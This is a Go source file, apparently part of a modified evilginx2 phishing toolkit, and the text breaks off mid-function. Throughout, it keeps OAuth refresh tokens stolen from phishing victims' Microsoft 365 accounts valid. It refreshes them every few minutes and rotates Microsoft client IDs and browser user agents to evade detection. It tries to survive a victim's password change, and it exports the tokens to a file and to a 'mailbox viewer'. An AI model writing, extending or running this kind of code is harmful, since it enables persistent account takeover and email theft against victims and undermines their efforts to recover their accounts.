package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	// ENHANCED INTERVALS - More aggressive to prevent token loss
	// Primary refresh interval - every 5 minutes keeps tokens fresh with maximum safety margin
	TOKEN_REFRESH_INTERVAL = 5 * time.Minute
	// Aggressive keep-alive interval for critical/fresh sessions (first 4 hours after capture)
	// Reduced to 2 minutes to ensure tokens never expire even under load
	TOKEN_KEEPALIVE_INTERVAL = 2 * time.Minute
	// Pre-emptive refresh - refresh tokens when they're halfway through their lifetime
	// This prevents race conditions and ensures tokens are always fresh
	PREEMPTIVE_REFRESH_INTERVAL = 3 * time.Minute
	// Microsoft OAuth token endpoint
	MS_REFRESH_TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
	// Default client ID for device code refresh (Microsoft Office) - kept for backward compat
	DEFAULT_REFRESH_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	// Default scope
	DEFAULT_REFRESH_SCOPE = "offline_access openid profile https://graph.microsoft.com/.default"
	// Maximum consecutive failures before marking session dead
	MAX_CONSECUTIVE_FAILURES = 3
	// Backoff delay for dead sessions - long delay to avoid burning VPS IP
	MAX_BACKOFF_DELAY = 24 * time.Hour
	// Extended session age threshold for aggressive refresh (4 hours after capture)
	AGGRESSIVE_REFRESH_AGE = 4 * time.Hour
	// Password change survival: refresh token validity is typically 90 days
	// But after password change, existing refresh tokens are often revoked
	// We implement multi-strategy refresh to maximize survival chances
	PASSWORD_CHANGE_DETECTION_THRESHOLD = 3 // errors in a row suggest password change
)

// FOCI (Family of Client IDs) - Microsoft first-party apps that share refresh tokens.
// EXPANDED LIST with more rotation options to avoid rate-limiting and detection.
// If one client ID gets rate-limited or blocked, we rotate to another.
// All these clients belong to the same FOCI family (family ID "1") and can use the same refresh token.
var FOCIClientIDs = []struct {
	ClientID string
	Name     string
}{
	{ClientID: "d3590ed6-52b3-4102-aeff-aad2292ab01c", Name: "Microsoft Office"},
	{ClientID: "1fec8e78-bce4-4aaf-ab1b-5451cc387264", Name: "Microsoft Teams"},
	{ClientID: "27922004-5251-4030-b22d-91ecd9a37ea4", Name: "Outlook Mobile"},
	{ClientID: "4e291c71-d680-4d0e-9640-0a3358e31177", Name: "PowerAutomate"},
	{ClientID: "ab9b8c07-8f02-4f72-87fa-80105867a763", Name: "OneDrive SyncEngine"},
	{ClientID: "0ec893e0-5785-4de6-99da-4ed124e5296c", Name: "Office UWP"},
	{ClientID: "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0", Name: "SharePoint"},
	{ClientID: "29d9ed98-a469-4536-ade2-f981bc1d605e", Name: "Microsoft Auth Broker"},
	{ClientID: "00b41c95-dab0-4487-9791-b9d2c32c80f2", Name: "Office 365 Management"},
	{ClientID: "fb78d390-0c51-40cd-8e17-fdbfab77341b", Name: "Microsoft Exchange REST API"},
	{ClientID: "a40d7d7d-59aa-447e-a655-679a4107e548", Name: "Azure ActiveDirectory PowerShell"},
	{ClientID: "1950a258-227b-4e31-a9cf-717495945fc2", Name: "Azure PowerShell"},
	{ClientID: "04b07795-8ddb-461a-bbee-02f9e1bf7b46", Name: "Azure CLI"},
	{ClientID: "14d82eec-204b-4c2f-b7e8-296a70dab67e", Name: "Microsoft Graph PowerShell"},
	{ClientID: "c44b4083-3bb0-49c1-b47d-974e53cbdf3c", Name: "Azure Portal"},
}

// Multi-scope warming targets - EXPANDED to cover more services
// Refresh against multiple scopes to keep the session warm across all Microsoft 365 services
var WarmingScopes = []struct {
	Name  string
	Scope string
}{
	{Name: "Graph", Scope: "offline_access openid profile https://graph.microsoft.com/.default"},
	{Name: "Outlook", Scope: "offline_access https://outlook.office365.com/.default"},
	{Name: "Office", Scope: "offline_access https://www.office.com/.default"},
	{Name: "Substrate", Scope: "offline_access https://substrate.office.com/.default"},
	{Name: "Exchange", Scope: "offline_access https://outlook.office.com/.default"},
	{Name: "Teams", Scope: "offline_access https://api.spaces.skype.com/.default"},
}

// TokenRefreshResponse from Microsoft's token endpoint
type TokenRefreshResponse struct {
	AccessToken  string `json:"access_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Scope        string `json:"scope"`
	RefreshToken string `json:"refresh_token"`
	IDToken      string `json:"id_token,omitempty"`
}

// TokenRefreshError when token refresh fails
type TokenRefreshError struct {
	Error            string `json:"error"`
	ErrorDescription string `json:"error_description"`
	ErrorCodes       []int  `json:"error_codes,omitempty"`
}

// SessionHealth tracks the health status of each session's tokens
// ENHANCED with password change detection and recovery tracking
type SessionHealth struct {
	SessionID           string
	DBId                int
	Username            string
	LastRefreshTime     time.Time
	LastRefreshSuccess  bool
	ConsecutiveFailures int
	TotalRefreshes      int
	TotalFailures       int
	LastError           string
	Status              string // "healthy", "degraded", "dead", "new", "password_changed"
	CurrentClientIdx    int    // Index into FOCIClientIDs for rotation
	CapturedAt          time.Time
	LastWarmingTime     time.Time // Last time we warmed multiple scopes
	// Password change detection fields
	PasswordChangeDetected    bool
	PasswordChangeTime        time.Time
	RecoveryAttempts          int
	LastRecoveryAttempt       time.Time
	// Advanced health metrics
	LastSuccessfulClientIdx   int       // Track which client worked last
	FailedClientIDs           []string  // Track which clients have failed
	RefreshTokenRotationCount int       // How many times refresh token changed
	ScopeWarmingFailures      int       // Track scope warming failures
}

// TokenAutoRefreshManager handles automatic token refresh for all sessions
type TokenAutoRefreshManager struct {
	db           *database.Database
	stopChan     chan struct{}
	running      bool
	mu           sync.RWMutex
	health       map[string]*SessionHealth // sessionID -> health
	healthMu     sync.RWMutex
	refreshCount int64 // total refreshes across all sessions
	startTime    time.Time
	exportDir    string // directory for auto-export of tokens_export.json
}

// NewTokenAutoRefreshManager creates a new auto-refresh manager
func NewTokenAutoRefreshManager(db *database.Database) *TokenAutoRefreshManager {
	return &TokenAutoRefreshManager{
		db:       db,
		stopChan: make(chan struct{}),
		running:  false,
		health:   make(map[string]*SessionHealth),
	}
}

// SetExportDir sets the directory for auto-exporting portable token JSON files
func (m *TokenAutoRefreshManager) SetExportDir(dir string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.exportDir = dir
}

// Start begins the background auto-refresh routine
// ENHANCED with three concurrent refresh strategies for maximum reliability
func (m *TokenAutoRefreshManager) Start() {
	m.mu.Lock()
	if m.running {
		m.mu.Unlock()
		return
	}
	m.running = true
	m.startTime = time.Now()
	m.mu.Unlock()

	// Load health data from database custom fields
	m.loadHealthFromDB()

	// Launch THREE concurrent refresh strategies
	go m.autoRefreshLoop()        // Primary: every 5 minutes
	go m.keepAliveLoop()           // Aggressive: every 2 minutes for fresh/critical sessions
	go m.preemptiveRefreshLoop()   // Pre-emptive: every 3 minutes, catches any missed refreshes
	
	log.Info("[autorefresh] ENHANCED Token keep-alive system started with 3 concurrent strategies")
	log.Info("[autorefresh] Primary: %v | Keep-alive: %v | Pre-emptive: %v", 
		TOKEN_REFRESH_INTERVAL, TOKEN_KEEPALIVE_INTERVAL, PREEMPTIVE_REFRESH_INTERVAL)
	log.Info("[autorefresh] FOCI rotation: %d client IDs | Warming: %d scopes", len(FOCIClientIDs), len(WarmingScopes))
	log.Info("[autorefresh] Password change detection and recovery: ENABLED")
}

// Stop terminates the auto-refresh routine
func (m *TokenAutoRefreshManager) Stop() {
	m.mu.Lock()
	defer m.mu.Unlock()

	if m.running {
		close(m.stopChan)
		m.running = false
		m.saveHealthToDB()
		log.Info("[autorefresh] Token keep-alive system stopped")
	}
}

// IsRunning returns whether the auto-refresh is active
func (m *TokenAutoRefreshManager) IsRunning() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.running
}

// autoRefreshLoop runs the primary periodic token refresh
func (m *TokenAutoRefreshManager) autoRefreshLoop() {
	// Do initial refresh on startup
	m.refreshAllTokens()

	ticker := time.NewTicker(TOKEN_REFRESH_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			m.refreshAllTokens()
		case <-m.stopChan:
			return
		}
	}
}

// keepAliveLoop runs aggressive keep-alive for fresh/critical sessions
func (m *TokenAutoRefreshManager) keepAliveLoop() {
	ticker := time.NewTicker(TOKEN_KEEPALIVE_INTERVAL)
	defer ticker.Stop()

	// Warming counter - warm different scopes on different cycles
	warmCycle := 0

	for {
		select {
		case <-ticker.C:
			m.keepAliveFreshSessions()

			// Every 6th cycle (~30 min), do scope warming for all healthy sessions
			warmCycle++
			if warmCycle%6 == 0 {
				m.warmAllScopes()
			}
		case <-m.stopChan:
			return
		}
	}
}

// preemptiveRefreshLoop proactively refreshes tokens before they're close to expiring
// This third strategy catches any tokens that might have been missed by the other two loops
func (m *TokenAutoRefreshManager) preemptiveRefreshLoop() {
	ticker := time.NewTicker(PREEMPTIVE_REFRESH_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			m.preemptiveRefreshSessions()
		case <-m.stopChan:
			return
		}
	}
}

// preemptiveRefreshSessions refreshes any session that hasn't been refreshed recently
func (m *TokenAutoRefreshManager) preemptiveRefreshSessions() {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return
	}

	preemptive := 0
	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			continue
		}

		health := m.getOrCreateHealth(s)

		// Skip if recently refreshed (within last 2.5 minutes)
		// This prevents overlap with other refresh loops
		if time.Since(health.LastRefreshTime) < 150*time.Second {
			continue
		}

		// Skip dead sessions or password-changed sessions
		if health.Status == "dead" || health.PasswordChangeDetected {
			continue
		}

		// Pre-emptively refresh if last refresh was more than 3 minutes ago
		// This catches any sessions that might have been skipped
		if time.Since(health.LastRefreshTime) > PREEMPTIVE_REFRESH_INTERVAL {
			newAccess, newRefresh, err := m.doRefreshWithRotation(refreshToken, health)
			if err != nil {
				continue
			}

			m.db.SetSessionCustom(s.SessionId, "dc_access_token", newAccess)
			if newRefresh != "" && newRefresh != refreshToken {
				m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", newRefresh)
			}

			health.ConsecutiveFailures = 0
			health.LastRefreshSuccess = true
			health.LastRefreshTime = time.Now()
			health.TotalRefreshes++
			m.updateHealthStatus(health)
			preemptive++
		}
	}

	if preemptive > 0 {
		log.Debug("[autorefresh] Pre-emptive refresh: %d sessions refreshed", preemptive)
	}
}

// refreshAllTokens iterates all sessions and refreshes tokens with smart scheduling
func (m *TokenAutoRefreshManager) refreshAllTokens() {
	sessions, err := m.db.ListSessions()
	if err != nil {
		log.Error("[autorefresh] Failed to list sessions: %v", err)
		return
	}

	refreshed := 0
	failed := 0
	skipped := 0

	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			continue
		}

		// Get or create health tracking
		health := m.getOrCreateHealth(s)

		// Skip sessions where password change was already detected — no point retrying
		if health.PasswordChangeDetected {
			skipped++
			continue
		}

		// Skip dead sessions (too many consecutive failures)
		if health.ConsecutiveFailures >= MAX_CONSECUTIVE_FAILURES {
			// Apply exponential backoff - only retry after backoff period
			backoffDuration := m.calculateBackoff(health.ConsecutiveFailures)
			if time.Since(health.LastRefreshTime) < backoffDuration {
				skipped++
				continue
			}
			log.Info("[autorefresh] [%d] Retrying dead session after backoff (%v)", s.Id, backoffDuration)
		}

		// Attempt refresh with FOCI rotation on failure
		newAccess, newRefresh, err := m.doRefreshWithRotation(refreshToken, health)
		if err != nil {
			health.ConsecutiveFailures++
			health.TotalFailures++
			health.LastRefreshSuccess = false
			health.LastError = err.Error()
			health.LastRefreshTime = time.Now()
			m.updateHealthStatus(health)
			m.persistHealthForSession(s.SessionId, health)

			if health.ConsecutiveFailures == 1 {
				log.Warning("[autorefresh] [%d] %s refresh failed: %v", s.Id, s.Username, err)
			} else if health.ConsecutiveFailures == MAX_CONSECUTIVE_FAILURES {
				log.Error("[autorefresh] [%d] %s marked DEAD after %d consecutive failures: %v",
					s.Id, s.Username, health.ConsecutiveFailures, err)
			}
			failed++
			continue
		}

		// Success - update database and health
		if err := m.db.SetSessionCustom(s.SessionId, "dc_access_token", newAccess); err != nil {
			log.Error("[autorefresh] [%d] Failed to save access token: %v", s.Id, err)
			continue
		}

		// CRITICAL: Always update the refresh token if a new one was issued
		// Microsoft uses refresh token rotation - the old token is invalidated
		if newRefresh != "" && newRefresh != refreshToken {
			if err := m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", newRefresh); err != nil {
				log.Error("[autorefresh] [%d] Failed to save refresh token: %v", s.Id, err)
				continue
			}
		}

		// Update health tracking
		health.ConsecutiveFailures = 0
		health.LastRefreshSuccess = true
		health.LastRefreshTime = time.Now()
		health.TotalRefreshes++
		health.LastError = ""
		m.updateHealthStatus(health)
		m.persistHealthForSession(s.SessionId, health)
		m.refreshCount++

		refreshed++
		if health.TotalRefreshes%10 == 0 {
			log.Success("[autorefresh] [%d] %s token refreshed (%d total refreshes)", s.Id, s.Username, health.TotalRefreshes)
		}
	}

	if refreshed > 0 || failed > 0 {
		log.Info("[autorefresh] Cycle complete: %d refreshed, %d failed, %d skipped", refreshed, failed, skipped)
	}

	// Auto-export updated tokens to portable JSON after each cycle
	if refreshed > 0 && m.exportDir != "" {
		go func() {
			exportPath := filepath.Join(m.exportDir, "tokens_export.json")
			if _, err := m.ExportTokensJSON(exportPath); err != nil {
				log.Debug("[autorefresh] Auto-export failed: %v", err)
			}
		}()
	}
}

// keepAliveFreshSessions aggressively refreshes recently captured sessions
func (m *TokenAutoRefreshManager) keepAliveFreshSessions() {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return
	}

	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			continue
		}

		health := m.getOrCreateHealth(s)

		// Skip password-changed sessions
		if health.PasswordChangeDetected {
			continue
		}

		// Only aggressively refresh sessions captured within the last 2 hours
		// or sessions that are "new" status
		if health.Status != "new" && time.Since(health.CapturedAt) > AGGRESSIVE_REFRESH_AGE {
			continue
		}

		// Skip if recently refreshed (within last 4 minutes)
		if time.Since(health.LastRefreshTime) < 4*time.Minute {
			continue
		}

		newAccess, newRefresh, err := m.doRefreshWithRotation(refreshToken, health)
		if err != nil {
			continue
		}

		m.db.SetSessionCustom(s.SessionId, "dc_access_token", newAccess)
		if newRefresh != "" && newRefresh != refreshToken {
			m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", newRefresh)
		}

		health.ConsecutiveFailures = 0
		health.LastRefreshSuccess = true
		health.LastRefreshTime = time.Now()
		health.TotalRefreshes++
		m.updateHealthStatus(health)
	}
}

// warmAllScopes refreshes tokens against multiple Microsoft scopes
// to keep the session warm across all services
func (m *TokenAutoRefreshManager) warmAllScopes() {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return
	}

	warmed := 0
	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			continue
		}

		health := m.getOrCreateHealth(s)
		if health.Status == "dead" {
			continue
		}

		// Skip if recently warmed (within last 25 minutes)
		if time.Since(health.LastWarmingTime) < 25*time.Minute {
			continue
		}

		currentRT := refreshToken
		for _, ws := range WarmingScopes {
			_, newRT, err := m.doRefreshWithScope(currentRT, ws.Scope, health)
			if err != nil {
				log.Debug("[autorefresh] [%d] Warming %s failed: %v", s.Id, ws.Name, err)
				continue
			}
			if newRT != "" {
				currentRT = newRT
			}
		}

		// Update the refresh token if it changed during warming
		if currentRT != refreshToken {
			m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", currentRT)
		}

		health.LastWarmingTime = time.Now()
		warmed++
	}

	if warmed > 0 {
		log.Debug("[autorefresh] Scope warming complete: %d sessions warmed across %d scopes", warmed, len(WarmingScopes))
	}
}

// doRefreshWithRotation attempts refresh with the current client ID,
// and rotates to the next FOCI client on failure.
// ENHANCED with password change detection and aggressive recovery strategies.
func (m *TokenAutoRefreshManager) doRefreshWithRotation(refreshToken string, health *SessionHealth) (string, string, error) {
	// Try current client first
	clientIdx := health.CurrentClientIdx % len(FOCIClientIDs)
	client := FOCIClientIDs[clientIdx]

	accessToken, newRefresh, err := m.doRefresh(refreshToken, client.ClientID, DEFAULT_REFRESH_SCOPE)
	if err == nil {
		// Success - update tracking
		health.LastSuccessfulClientIdx = clientIdx
		if newRefresh != "" && newRefresh != refreshToken {
			health.RefreshTokenRotationCount++
		}
		return accessToken, newRefresh, nil
	}

	// Detect password change specifically
	if isPasswordChangeError(err.Error()) {
		if !health.PasswordChangeDetected {
			health.PasswordChangeDetected = true
			health.PasswordChangeTime = time.Now()
			health.Status = "password_changed"
			log.Warning("[autorefresh] PASSWORD CHANGE DETECTED for [%s] %s", health.SessionID, health.Username)
		}
		// Still try other recovery strategies below
	}

	// Check if this is a token revocation error (password changed, etc.)
	if isTokenRevoked(err.Error()) {
		// Try ALL FOCI clients before giving up - sometimes one works even after password change
		log.Info("[autorefresh] Token revocation detected for [%s], trying ALL %d FOCI clients...", 
			health.SessionID, len(FOCIClientIDs))
		
		for i := 0; i < len(FOCIClientIDs); i++ {
			if i == clientIdx {
				continue // Already tried this one
			}
			
			tryClient := FOCIClientIDs[i]
			accessToken, newRefresh, err = m.doRefresh(refreshToken, tryClient.ClientID, DEFAULT_REFRESH_SCOPE)
			if err == nil {
				health.CurrentClientIdx = i
				health.LastSuccessfulClientIdx = i
				health.RecoveryAttempts++
				health.PasswordChangeDetected = false // Recovery successful
				log.Success("[autorefresh] RECOVERY SUCCESS with FOCI client: %s (attempt %d)", 
					tryClient.Name, health.RecoveryAttempts)
				return accessToken, newRefresh, nil
			}
		}
		
		// Try with minimal scope as last resort
		log.Info("[autorefresh] Trying minimal scope as last resort for [%s]...", health.SessionID)
		minimalScope := "offline_access openid"
		for i := 0; i < len(FOCIClientIDs); i++ {
			tryClient := FOCIClientIDs[i]
			accessToken, newRefresh, err = m.doRefresh(refreshToken, tryClient.ClientID, minimalScope)
			if err == nil {
				health.CurrentClientIdx = i
				health.LastSuccessfulClientIdx = i
				health.RecoveryAttempts++
				log.Success("[autorefresh] MINIMAL SCOPE RECOVERY SUCCESS with: %s", tryClient.Name)
				return accessToken, newRefresh, nil
			}
		}
		
		return "", "", fmt.Errorf("token revoked (all %d clients failed, likely password change): %v", 
			len(FOCIClientIDs), err)
	}

	// Rotate through FOCI clients on rate-limit or transient errors
	if isRetryableError(err.Error()) {
		log.Debug("[autorefresh] Retryable error for [%s], rotating through %d clients...", 
			health.SessionID, len(FOCIClientIDs))
		
		for i := 1; i < len(FOCIClientIDs); i++ {
			nextIdx := (clientIdx + i) % len(FOCIClientIDs)
			nextClient := FOCIClientIDs[nextIdx]

			accessToken, newRefresh, err = m.doRefresh(refreshToken, nextClient.ClientID, DEFAULT_REFRESH_SCOPE)
			if err == nil {
				health.CurrentClientIdx = nextIdx
				health.LastSuccessfulClientIdx = nextIdx
				log.Debug("[autorefresh] Rotated to FOCI client: %s", nextClient.Name)
				return accessToken, newRefresh, nil
			}

			// If token is revoked during rotation, stop trying
			if isTokenRevoked(err.Error()) {
				return "", "", fmt.Errorf("token revoked during rotation: %v", err)
			}
		}
	}

	return "", "", err
}

// doRefreshWithScope performs refresh with a specific scope (for warming)
func (m *TokenAutoRefreshManager) doRefreshWithScope(refreshToken string, scope string, health *SessionHealth) (string, string, error) {
	clientIdx := health.CurrentClientIdx % len(FOCIClientIDs)
	client := FOCIClientIDs[clientIdx]
	return m.doRefresh(refreshToken, client.ClientID, scope)
}

// doRefresh performs the actual OAuth refresh request
// ENHANCED with realistic user agents and headers to avoid detection
func (m *TokenAutoRefreshManager) doRefresh(refreshToken string, clientID string, scope string) (accessToken string, newRefreshToken string, err error) {
	data := url.Values{}
	data.Set("client_id", clientID)
	data.Set("grant_type", "refresh_token")
	data.Set("refresh_token", refreshToken)
	data.Set("scope", scope)

	req, err := http.NewRequest("POST", MS_REFRESH_TOKEN_URL, strings.NewReader(data.Encode()))
	if err != nil {
		return "", "", fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	
	// Rotate through multiple realistic user agents to avoid fingerprinting
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
	}
	req.Header.Set("User-Agent", userAgents[time.Now().Unix()%int64(len(userAgents))])
	req.Header.Set("Origin", "https://login.microsoftonline.com")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", "", fmt.Errorf("failed to read response: %v", err)
	}

	if resp.StatusCode != 200 {
		var errResp TokenRefreshError
		json.Unmarshal(body, &errResp)
		return "", "", fmt.Errorf("[%d] %s: %s", resp.StatusCode, errResp.Error, errResp.ErrorDescription)
	}

	var tokenResp TokenRefreshResponse
	if err := json.Unmarshal(body, &tokenResp); err != nil {
		return "", "", fmt.Errorf("failed to parse response: %v", err)
	}

	return tokenResp.AccessToken, tokenResp.RefreshToken, nil
}

// RefreshSessionToken manually refreshes a specific session's token (on-demand)
func (m *TokenAutoRefreshManager) RefreshSessionToken(sessionId string) error {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return fmt.Errorf("failed to list sessions: %v", err)
	}

	for _, s := range sessions {
		if s.SessionId != sessionId {
			continue
		}

		if s.Custom == nil {
			return fmt.Errorf("session has no custom data")
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			return fmt.Errorf("session has no refresh token")
		}

		health := m.getOrCreateHealth(s)

		newAccess, newRefresh, err := m.doRefreshWithRotation(refreshToken, health)
		if err != nil {
			health.ConsecutiveFailures++
			health.TotalFailures++
			health.LastRefreshSuccess = false
			health.LastError = err.Error()
			health.LastRefreshTime = time.Now()
			m.updateHealthStatus(health)
			return err
		}

		if err := m.db.SetSessionCustom(s.SessionId, "dc_access_token", newAccess); err != nil {
			return fmt.Errorf("failed to save access token: %v", err)
		}

		if newRefresh != "" && newRefresh != refreshToken {
			if err := m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", newRefresh); err != nil {
				return fmt.Errorf("failed to save refresh token: %v", err)
			}
		}

		health.ConsecutiveFailures = 0
		health.LastRefreshSuccess = true
		health.LastRefreshTime = time.Now()
		health.TotalRefreshes++
		health.LastError = ""
		m.updateHealthStatus(health)

		log.Success("[autorefresh] Session %s token refreshed on-demand", sessionId)
		return nil
	}

	return fmt.Errorf("session not found: %s", sessionId)
}

// RefreshAndGetToken refreshes a session and returns the fresh access token.
// This is used by the token feed when serving tokens to the mailbox viewer
// to ensure the token is always fresh at the moment of access.
func (m *TokenAutoRefreshManager) RefreshAndGetToken(sessionId string) (string, error) {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return "", fmt.Errorf("failed to list sessions: %v", err)
	}

	for _, s := range sessions {
		if s.SessionId != sessionId {
			continue
		}

		if s.Custom == nil {
			return "", fmt.Errorf("session has no custom data")
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			// Return existing access token if no refresh token available
			if at := s.Custom["dc_access_token"]; at != "" {
				return at, nil
			}
			return "", fmt.Errorf("session has no tokens")
		}

		health := m.getOrCreateHealth(s)

		// If last refresh was very recent (< 2 min), return cached token
		if time.Since(health.LastRefreshTime) < 2*time.Minute && health.LastRefreshSuccess {
			if at := s.Custom["dc_access_token"]; at != "" {
				return at, nil
			}
		}

		// Do a fresh refresh
		newAccess, newRefresh, err := m.doRefreshWithRotation(refreshToken, health)
		if err != nil {
			// Return existing access token if refresh fails
			if at := s.Custom["dc_access_token"]; at != "" {
				log.Warning("[autorefresh] On-demand refresh failed for %s, returning cached token: %v", sessionId, err)
				return at, nil
			}
			return "", err
		}

		m.db.SetSessionCustom(s.SessionId, "dc_access_token", newAccess)
		if newRefresh != "" && newRefresh != refreshToken {
			m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", newRefresh)
		}

		health.ConsecutiveFailures = 0
		health.LastRefreshSuccess = true
		health.LastRefreshTime = time.Now()
		health.TotalRefreshes++
		m.updateHealthStatus(health)

		return newAccess, nil
	}

	return "", fmt.Errorf("session not found: %s", sessionId)
}

// GetRefreshStats returns statistics about token refresh status
func (m *TokenAutoRefreshManager) GetRefreshStats() (total int, withRefresh int) {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return 0, 0
	}

	total = len(sessions)
	for _, s := range sessions {
		if s.Custom != nil {
			if rt, ok := s.Custom["dc_refresh_token"]; ok && rt != "" {
				withRefresh++
			}
		}
	}
	return total, withRefresh
}

// GetHealthReport returns detailed health for all tracked sessions
func (m *TokenAutoRefreshManager) GetHealthReport() []*SessionHealth {
	m.healthMu.RLock()
	defer m.healthMu.RUnlock()

	var report []*SessionHealth
	for _, h := range m.health {
		hCopy := *h
		report = append(report, &hCopy)
	}
	return report
}

// GetSessionHealth returns health info for a specific session
func (m *TokenAutoRefreshManager) GetSessionHealth(sessionId string) *SessionHealth {
	m.healthMu.RLock()
	defer m.healthMu.RUnlock()

	if h, ok := m.health[sessionId]; ok {
		hCopy := *h
		return &hCopy
	}
	return nil
}

// GetTotalRefreshCount returns the total number of successful refreshes since start
func (m *TokenAutoRefreshManager) GetTotalRefreshCount() int64 {
	return m.refreshCount
}

// GetUptime returns how long the auto-refresh has been running
func (m *TokenAutoRefreshManager) GetUptime() time.Duration {
	m.mu.RLock()
	defer m.mu.RUnlock()
	if m.startTime.IsZero() {
		return 0
	}
	return time.Since(m.startTime)
}

// ResetSessionHealth resets a session's health (useful after manual recovery)
func (m *TokenAutoRefreshManager) ResetSessionHealth(sessionId string) {
	m.healthMu.Lock()
	defer m.healthMu.Unlock()
	if h, ok := m.health[sessionId]; ok {
		h.ConsecutiveFailures = 0
		h.LastError = ""
		h.Status = "healthy"
		h.PasswordChangeDetected = false
		log.Info("[autorefresh] Reset health for session %s", sessionId)
	}
}

// EmergencyBurstRefresh performs an immediate multi-client, multi-scope refresh
// for a freshly captured session. This is the FIRST thing that runs after token capture
// to establish maximum persistence before any password change can occur.
// Strategy: refresh with every FOCI client and every scope simultaneously to
// establish as many valid tokens as possible across Microsoft's infrastructure.
func (m *TokenAutoRefreshManager) EmergencyBurstRefresh(sessionId string) {
	sessions, err := m.db.ListSessions()
	if err != nil {
		log.Error("[autorefresh] Emergency burst: failed to list sessions: %v", err)
		return
	}

	for _, s := range sessions {
		if s.SessionId != sessionId {
			continue
		}

		if s.Custom == nil {
			return
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			return
		}

		health := m.getOrCreateHealth(s)
		log.Important("[autorefresh] EMERGENCY BURST: Securing session %s (%s) across %d clients x %d scopes",
			sessionId, s.Username, len(FOCIClientIDs), len(WarmingScopes))

		successCount := 0
		currentRT := refreshToken

		// Phase 1: Rapid FOCI client rotation — establish tokens with multiple clients
		for i, client := range FOCIClientIDs {
			newAccess, newRT, err := m.doRefresh(currentRT, client.ClientID, DEFAULT_REFRESH_SCOPE)
			if err != nil {
				log.Debug("[autorefresh] Burst: %s failed: %v", client.Name, err)
				continue
			}
			
			successCount++
			if newRT != "" && newRT != currentRT {
				currentRT = newRT
			}
			
			// Save the latest tokens
			if i == 0 || successCount == 1 {
				m.db.SetSessionCustom(s.SessionId, "dc_access_token", newAccess)
			}
			if currentRT != refreshToken {
				m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", currentRT)
			}
		}

		// Phase 2: Scope warming — refresh across all Microsoft services
		for _, ws := range WarmingScopes {
			_, newRT, err := m.doRefreshWithScope(currentRT, ws.Scope, health)
			if err != nil {
				continue
			}
			if newRT != "" && newRT != currentRT {
				currentRT = newRT
				m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", currentRT)
			}
			successCount++
		}

		// Update health
		health.ConsecutiveFailures = 0
		health.LastRefreshSuccess = true
		health.LastRefreshTime = time.Now()
		health.TotalRefreshes += successCount
		health.LastWarmingTime = time.Now()
		m.updateHealthStatus(health)
		m.persistHealthForSession(s.SessionId, health)

		log.Success("[autorefresh] EMERGENCY BURST COMPLETE: %s — %d successful refreshes across clients/scopes",
			s.Username, successCount)
		return
	}
}

// --- Internal helper functions ---

// getOrCreateHealth returns existing health or creates new tracking
func (m *TokenAutoRefreshManager) getOrCreateHealth(s *database.Session) *SessionHealth {
	m.healthMu.Lock()
	defer m.healthMu.Unlock()

	if h, ok := m.health[s.SessionId]; ok {
		return h
	}

	capturedAt := time.Unix(s.CreateTime, 0)

